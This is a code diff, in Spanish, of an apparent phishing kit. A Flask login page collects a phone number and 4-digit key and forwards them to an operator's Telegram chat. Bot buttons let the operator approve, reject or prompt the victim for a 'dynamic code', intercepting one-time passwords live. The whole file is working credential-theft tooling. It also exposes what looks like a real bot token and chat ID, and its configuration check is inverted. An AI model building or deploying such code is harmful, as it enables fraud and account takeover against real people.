@@ -2,13 +2,20 @@
 # SERVIDOR WEB + BOT DE TELEGRAM
 # ========================================
 
-from flask import Flask, render_template_string, request, jsonify, session
+from flask import Flask, render_template_string, request, jsonify
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, MessageHandler, ContextTypes, filters
-import asyncio
+from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
 import threading
 from datetime import datetime
 import secrets
+import asyncio
+import logging
+
+# Configurar logging
+logging.basicConfig(
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    level=logging.INFO
+)
 
 app = Flask(__name__)
 app.secret_key = secrets.token_hex(16)
@@ -16,17 +23,18 @@ app.secret_key = secrets.token_hex(16)
 # ========================================
 # CONFIGURACIÓN - CAMBIA ESTOS VALORES
 # ========================================
-BOT_TOKEN = "8387679229:AAEPfB79Soov3uLZTyv3Lq9rbifJxeoJcwc"
-ADMIN_CHAT_ID = "8469651553"  # Tu ID de Telegram
+BOT_TOKEN = "TU_TOKEN_AQUI"  # Reemplaza con tu token
+ADMIN_CHAT_ID = "TU_CHAT_ID_AQUI"  # Reemplaza con tu chat ID
 
 # Base de datos temporal en memoria
 usuarios_activos = {}
 bot_app = None
+loop = None
 
 # ========================================
 # PÁGINA WEB HTML
 # ========================================
-HTML_LOGIN = """
+HTML_LOGIN = r"""
 <!DOCTYPE html>
 <html lang="es">
 <head>
@@ -106,6 +114,11 @@ HTML_LOGIN = """
         .btn:active {
             transform: translateY(0);
         }
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
         .mensaje {
             padding: 16px;
             border-radius: 12px;
@@ -176,7 +189,7 @@ HTML_LOGIN = """
                 <label>🔑 Clave (4 dígitos)</label>
                 <input type="password" id="clave" placeholder="••••" maxlength="4">
             </div>
-            <button class="btn" onclick="enviarLogin()">Entrar</button>
+            <button class="btn" onclick="enviarLogin()" id="btnLogin">Entrar</button>
         </div>
 
         <div id="esperando-codigo">
@@ -195,9 +208,10 @@ HTML_LOGIN = """
         let checkInterval;
 
         async function enviarLogin() {
-            const numero = document.getElementById('numero').value;
-            const clave = document.getElementById('clave').value;
+            const numero = document.getElementById('numero').value.trim();
+            const clave = document.getElementById('clave').value.trim();
             const mensaje = document.getElementById('mensaje');
+            const btnLogin = document.getElementById('btnLogin');
 
             if (!numero || !clave) {
                 mensaje.className = 'mensaje error';
@@ -205,7 +219,7 @@ HTML_LOGIN = """
                 return;
             }
 
-            if (clave.length !== 4 || !/^\d+$/.test(clave)) {
+            if (clave.length !== 4 || !/^[0-9]+$/.test(clave)) {
                 mensaje.className = 'mensaje error';
                 mensaje.textContent = '❌ La clave debe tener 4 dígitos';
                 return;
@@ -213,6 +227,7 @@ HTML_LOGIN = """
 
             mensaje.className = 'mensaje loading';
             mensaje.textContent = '⏳ Verificando credenciales...';
+            btnLogin.disabled = true;
 
             try {
                 const response = await fetch('/login', {
@@ -230,15 +245,16 @@ HTML_LOGIN = """
                     mensaje.className = 'mensaje success';
                     mensaje.textContent = '✅ Credenciales verificadas';
                     
-                    // Revisar estado cada 2 segundos
                     checkInterval = setInterval(checkStatus, 2000);
                 } else {
                     mensaje.className = 'mensaje error';
-                    mensaje.textContent = data.message;
+                    mensaje.textContent = data.message || '❌ Error al verificar credenciales';
+                    btnLogin.disabled = false;
                 }
             } catch (error) {
                 mensaje.className = 'mensaje error';
                 mensaje.textContent = '❌ Error de conexión';
+                btnLogin.disabled = false;
             }
         }
 
@@ -257,13 +273,19 @@ HTML_LOGIN = """
                 } else if (data.status === 'rechazado') {
                     clearInterval(checkInterval);
                     document.getElementById('mensaje').className = 'mensaje error';
-                    document.getElementById('mensaje').textContent = '❌ ' + data.message;
+                    document.getElementById('mensaje').textContent = '❌ ' + (data.message || 'Acceso denegado');
                     setTimeout(() => location.reload(), 3000);
                 }
             } catch (error) {
                 console.error('Error checking status:', error);
             }
         }
+
+        document.getElementById('clave').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                enviarLogin();
+            }
+        });
     </script>
 </body>
 </html>
@@ -330,15 +352,16 @@ def index():
     return render_template_string(HTML_LOGIN)
 
 @app.route('/login', methods=['POST'])
-async def login():
+def login():
     data = request.json
-    numero = data.get('numero')
-    clave = data.get('clave')
+    numero = data.get('numero', '').strip()
+    clave = data.get('clave', '').strip()
     
-    # Generar ID de sesión único
+    if not numero or not clave:
+        return jsonify({'success': False, 'message': 'Datos incompletos'}), 400
+    
     session_id = secrets.token_hex(8)
     
-    # Guardar datos del usuario
     usuarios_activos[session_id] = {
         'numero': numero,
         'clave': clave,
@@ -347,14 +370,21 @@ async def login():
         'codigo_dinamico': None
     }
     
-    # Enviar notificación al admin por Telegram
-    await enviar_notificacion_admin(session_id, numero, clave)
+    # Enviar notificación al admin
+    if loop and bot_app:
+        asyncio.run_coroutine_threadsafe(
+            enviar_notificacion_admin(session_id, numero, clave),
+            loop
+        )
+        logging.info(f"✅ Notificación enviada para sesión: {session_id}")
+    else:
+        logging.error("❌ Bot no está inicializado correctamente")
     
     return jsonify({'success': True, 'session_id': session_id})
 
 @app.route('/check_status')
 def check_status():
-    session_id = request.args.get('session')
+    session_id = request.args.get('session', '').strip()
     
     if session_id in usuarios_activos:
         user_data = usuarios_activos[session_id]
@@ -363,103 +393,188 @@ def check_status():
             'message': user_data.get('message', '')
         })
     
-    return jsonify({'status': 'error', 'message': 'Sesión no encontrada'})
+    return jsonify({'status': 'error', 'message': 'Sesión no encontrada'}), 404
 
 @app.route('/exito')
 def exito():
     return render_template_string(HTML_EXITO)
 
+@app.route('/health')
+def health():
+    """Endpoint para verificar que el servidor está vivo"""
+    bot_status = "activo" if bot_app else "inactivo"
+    return jsonify({
+        'status': 'ok',
+        'bot': bot_status,
+        'sesiones_activas': len(usuarios_activos)
+    })
+
 # ========================================
 # BOT DE TELEGRAM
 # ========================================
 async def enviar_notificacion_admin(session_id, numero, clave):
-    """Envía notificación al admin cuando alguien ingresa datos"""
+    """Envía notificación con botones inline al admin"""
     mensaje = (
-        f"🚨 NUEVO LOGIN DETECTADO\n"
+        f"🚨 <b>NUEVO LOGIN DETECTADO</b>\n"
         f"━━━━━━━━━━━━━━━━━━━━\n"
-        f"📱 Número: {numero}\n"
-        f"🔑 Clave: {clave}\n"
-        f"🆔 Sesión: {session_id}\n"
+        f"📱 Número: <code>{numero}</code>\n"
+        f"🔑 Clave: <code>{clave}</code>\n"
+        f"🆔 Sesión: <code>{session_id}</code>\n"
         f"⏰ {datetime.now().strftime('%H:%M:%S')}\n"
-        f"━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"Usa estos comandos:\n"
-        f"/pedir {session_id}\n"
-        f"/aprobar {session_id}\n"
-        f"/rechazar {session_id}"
+        f"━━━━━━━━━━━━━━━━━━━━"
     )
+    
+    # Crear botones inline
+    keyboard = [
+        [
+            InlineKeyboardButton("✅ Aprobar", callback_data=f"aprobar_{session_id}"),
+            InlineKeyboardButton("❌ Rechazar", callback_data=f"rechazar_{session_id}")
+        ],
+        [
+            InlineKeyboardButton("🔄 Pedir Código", callback_data=f"pedir_{session_id}")
+        ],
+        [
+            InlineKeyboardButton("📋 Ver Lista", callback_data="lista")
+        ]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
     
     try:
-        await bot_app.bot.send_message(chat_id=ADMIN_CHAT_ID, text=mensaje)
+        await bot_app.bot.send_message(
+            chat_id=ADMIN_CHAT_ID,
+            text=mensaje,
+            reply_markup=reply_markup,
+            parse_mode='HTML'
+        )
+        logging.info(f"✅ Mensaje enviado exitosamente a {ADMIN_CHAT_ID}")
     except Exception as e:
-        print(f"Error enviando mensaje: {e}")
+        logging.error(f"❌ Error enviando mensaje: {e}")
 
-async def cmd_pedir(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Comando /pedir SESSION_ID - Pide el código dinámico"""
-    if str(update.effective_user.id) != ADMIN_CHAT_ID:
-        await update.message.reply_text("❌ No autorizado")
+async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Maneja los clicks en los botones inline"""
+    query = update.callback_query
+    await query.answer()
+    
+    # Verificar que sea el admin
+    if str(query.from_user.id) != ADMIN_CHAT_ID:
+        await query.edit_message_text("❌ No autorizado")
         return
     
-    if not context.args:
-        await update.message.reply_text("❌ Uso: /pedir SESSION_ID")
-        return
+    data = query.data
     
-    session_id = context.args[0]
-    
-    if session_id not in usuarios_activos:
-        await update.message.reply_text("❌ Sesión no encontrada")
-        return
-    
-    usuarios_activos[session_id]['status'] = 'pidiendo_codigo'
-    
-    await update.message.reply_text(
-        f"✅ Ahora el usuario verá: 'Ingresa tu código dinámico'\n\n"
-        f"Espera a que ingrese el código y te llegará aquí.\n"
-        f"Sesión: {session_id}"
-    )
+    if data == "lista":
+        await cmd_lista_inline(query)
+    elif data.startswith("aprobar_"):
+        session_id = data.replace("aprobar_", "")
+        await aprobar_session(query, session_id)
+    elif data.startswith("rechazar_"):
+        session_id = data.replace("rechazar_", "")
+        await rechazar_session(query, session_id)
+    elif data.startswith("pedir_"):
+        session_id = data.replace("pedir_", "")
+        await pedir_codigo(query, session_id)
 
-async def cmd_aprobar(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Comando /aprobar SESSION_ID - Aprueba el acceso"""
-    if str(update.effective_user.id) != ADMIN_CHAT_ID:
-        await update.message.reply_text("❌ No autorizado")
-        return
-    
-    if not context.args:
-        await update.message.reply_text("❌ Uso: /aprobar SESSION_ID")
-        return
-    
-    session_id = context.args[0]
-    
+async def aprobar_session(query, session_id):
+    """Aprueba una sesión"""
     if session_id not in usuarios_activos:
-        await update.message.reply_text("❌ Sesión no encontrada")
+        await query.edit_message_text("❌ Sesión no encontrada")
         return
     
     usuarios_activos[session_id]['status'] = 'aprobado'
     
-    await update.message.reply_text(f"✅ Sesión {session_id} APROBADA\nEl usuario verá 'Acceso exitoso'")
+    await query.edit_message_text(
+        f"✅ <b>SESIÓN APROBADA</b>\n\n"
+        f"🆔 Sesión: <code>{session_id}</code>\n"
+        f"📱 Número: {usuarios_activos[session_id]['numero']}\n"
+        f"⏰ {datetime.now().strftime('%H:%M:%S')}\n\n"
+        f"El usuario verá: <i>Acceso exitoso</i>",
+        parse_mode='HTML'
+    )
 
-async def cmd_rechazar(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Comando /rechazar SESSION_ID - Rechaza el acceso"""
-    if str(update.effective_user.id) != ADMIN_CHAT_ID:
-        await update.message.reply_text("❌ No autorizado")
-        return
-    
-    if not context.args:
-        await update.message.reply_text("❌ Uso: /rechazar SESSION_ID")
-        return
-    
-    session_id = context.args[0]
-    
+async def rechazar_session(query, session_id):
+    """Rechaza una sesión"""
     if session_id not in usuarios_activos:
-        await update.message.reply_text("❌ Sesión no encontrada")
+        await query.edit_message_text("❌ Sesión no encontrada")
         return
     
     usuarios_activos[session_id]['status'] = 'rechazado'
     usuarios_activos[session_id]['message'] = 'Credenciales incorrectas'
     
-    await update.message.reply_text(f"❌ Sesión {session_id} RECHAZADA\nEl usuario verá error")
+    await query.edit_message_text(
+        f"❌ <b>SESIÓN RECHAZADA</b>\n\n"
+        f"🆔 Sesión: <code>{session_id}</code>\n"
+        f"📱 Número: {usuarios_activos[session_id]['numero']}\n"
+        f"⏰ {datetime.now().strftime('%H:%M:%S')}\n\n"
+        f"El usuario verá: <i>Credenciales incorrectas</i>",
+        parse_mode='HTML'
+    )
+
+async def pedir_codigo(query, session_id):
+    """Solicita código dinámico"""
+    if session_id not in usuarios_activos:
+        await query.edit_message_text("❌ Sesión no encontrada")
+        return
+    
+    usuarios_activos[session_id]['status'] = 'pidiendo_codigo'
+    
+    await query.edit_message_text(
+        f"🔄 <b>CÓDIGO SOLICITADO</b>\n\n"
+        f"🆔 Sesión: <code>{session_id}</code>\n"
+        f"📱 Número: {usuarios_activos[session_id]['numero']}\n"
+        f"⏰ {datetime.now().strftime('%H:%M:%S')}\n\n"
+        f"El usuario verá: <i>Ingresa tu código dinámico</i>\n\n"
+        f"Esperando respuesta del usuario...",
+        parse_mode='HTML'
+    )
+
+async def cmd_lista_inline(query):
+    """Muestra lista de sesiones"""
+    if not usuarios_activos:
+        await query.edit_message_text("📝 No hay sesiones activas")
+        return
+    
+    mensaje = "📝 <b>SESIONES ACTIVAS:</b>\n━━━━━━━━━━━━━━━━━━━━\n\n"
+    
+    for session_id, data in list(usuarios_activos.items())[:5]:  # Máximo 5
+        mensaje += (
+            f"🆔 <code>{session_id}</code>\n"
+            f"📱 {data['numero']}\n"
+            f"🔑 {data['clave']}\n"
+            f"📊 Estado: {data['status']}\n"
+            f"⏰ {data['timestamp']}\n"
+            f"━━━━━━━━━━━━━━━━━━━━\n\n"
+        )
+    
+    keyboard = [[InlineKeyboardButton("🔙 Volver", callback_data="volver")]]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    await query.edit_message_text(mensaje, reply_markup=reply_markup, parse_mode='HTML')
+
+# Comandos tradicionales
+async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Comando /start"""
+    await update.message.reply_text(
+        "🤖 <b>Bot de Monitoreo Iniciado</b>\n\n"
+        "Usa /help para ver los comandos disponibles\n"
+        "Las notificaciones llegarán automáticamente con botones interactivos",
+        parse_mode='HTML'
+    )
+
+async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Comando /help"""
+    mensaje = (
+        "🤖 <b>COMANDOS DISPONIBLES:</b>\n"
+        "━━━━━━━━━━━━━━━━━━━━\n\n"
+        "/start - Iniciar bot\n"
+        "/help - Ver ayuda\n"
+        "/lista - Ver sesiones activas\n"
+        "/status - Estado del sistema\n\n"
+        "<i>💡 Las notificaciones incluyen botones para control rápido</i>"
+    )
+    await update.message.reply_text(mensaje, parse_mode='HTML')
 
 async def cmd_lista(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Comando /lista - Muestra todas las sesiones activas"""
+    """Comando /lista"""
     if str(update.effective_user.id) != ADMIN_CHAT_ID:
         await update.message.reply_text("❌ No autorizado")
         return
@@ -468,61 +583,90 @@ async def cmd_lista(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("📝 No hay sesiones activas")
         return
     
-    mensaje = "📝 SESIONES ACTIVAS:\n━━━━━━━━━━━━━━━━━━━━\n\n"
+    mensaje = "📝 <b>SESIONES ACTIVAS:</b>\n━━━━━━━━━━━━━━━━━━━━\n\n"
     
     for session_id, data in usuarios_activos.items():
         mensaje += (
-            f"🆔 {session_id}\n"
+            f"🆔 <code>{session_id}</code>\n"
             f"📱 {data['numero']}\n"
             f"🔑 {data['clave']}\n"
             f"📊 Estado: {data['status']}\n"
             f"⏰ {data['timestamp']}\n"
             f"━━━━━━━━━━━━━━━━━━━━\n\n"
         )
+        
+        if len(mensaje) > 3500:
+            await update.message.reply_text(mensaje, parse_mode='HTML')
+            mensaje = ""
     
-    await update.message.reply_text(mensaje)
+    if mensaje:
+        await update.message.reply_text(mensaje, parse_mode='HTML')
 
-async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Comando /help - Muestra ayuda"""
+async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Comando /status"""
+    if str(update.effective_user.id) != ADMIN_CHAT_ID:
+        await update.message.reply_text("❌ No autorizado")
+        return
+    
     mensaje = (
-        "🤖 COMANDOS DISPONIBLES:\n"
-        "━━━━━━━━━━━━━━━━━━━━\n\n"
-        "/lista - Ver sesiones activas\n"
-        "/pedir SESSION_ID - Pedir código dinámico\n"
-        "/aprobar SESSION_ID - Aprobar acceso\n"
-        "/rechazar SESSION_ID - Rechazar acceso\n"
-        "/help - Ver esta ayuda"
+        f"📊 <b>ESTADO DEL SISTEMA</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"🤖 Bot: Activo\n"
+        f"🌐 Servidor: Activo\n"
+        f"📝 Sesiones: {len(usuarios_activos)}\n"
+        f"⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
     )
-    await update.message.reply_text(mensaje)
+    await update.message.reply_text(mensaje, parse_mode='HTML')
 
 # ========================================
 # INICIALIZACIÓN
 # ========================================
 def run_bot():
-    """Ejecuta el bot de Telegram en un thread separado"""
-    global bot_app
+    """Ejecuta el bot de Telegram"""
+    global bot_app, loop
+    
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    
     bot_app = Application.builder().token(BOT_TOKEN).build()
     
-    bot_app.add_handler(CommandHandler("pedir", cmd_pedir))
-    bot_app.add_handler(CommandHandler("aprobar", cmd_aprobar))
-    bot_app.add_handler(CommandHandler("rechazar", cmd_rechazar))
-    bot_app.add_handler(CommandHandler("lista", cmd_lista))
+    # Agregar handlers
+    bot_app.add_handler(CommandHandler("start", cmd_start))
     bot_app.add_handler(CommandHandler("help", cmd_help))
+    bot_app.add_handler(CommandHandler("lista", cmd_lista))
+    bot_app.add_handler(CommandHandler("status", cmd_status))
+    bot_app.add_handler(CallbackQueryHandler(button_callback))
     
-    print("🤖 Bot de Telegram iniciado")
-    bot_app.run_polling(allowed_updates=Update.ALL_TYPES)
+    logging.info("🤖 Bot de Telegram iniciado")
+    logging.info(f"👤 Admin ID: {ADMIN_CHAT_ID}")
+    
+    bot_app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
 
 if __name__ == '__main__':
+    print("=" * 50)
+    print("🚀 INICIANDO SISTEMA")
+    print("=" * 50)
+    
+    # Verificar configuración
+    if BOT_TOKEN == "8387679229:AAEPfB79Soov3uLZTyv3Lq9rbifJxeoJcwc" or ADMIN_CHAT_ID == "8469651553":
+        print("❌ ERROR: Debes configurar BOT_TOKEN y ADMIN_CHAT_ID")
+        print("📝 Edita las líneas 30-31 del código")
+        exit(1)
+    
     # Iniciar bot en thread separado
     bot_thread = threading.Thread(target=run_bot, daemon=True)
     bot_thread.start()
     
+    import time
+    time.sleep(3)
+    
     print("=" * 50)
-    print("🌐 SERVIDOR WEB INICIADO")
+    print("✅ SERVIDOR WEB INICIADO")
     print("=" * 50)
-    print("📱 Abre: http://localhost:5000")
+    print("📱 Local: http://localhost:5000")
+    print("🌐 Red: http://0.0.0.0:5000")
     print("🤖 Bot de Telegram activo")
     print("=" * 50)
     
     # Iniciar servidor web
-    app.run(host='0.0.0.0', port=5000, debug=False)
+    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
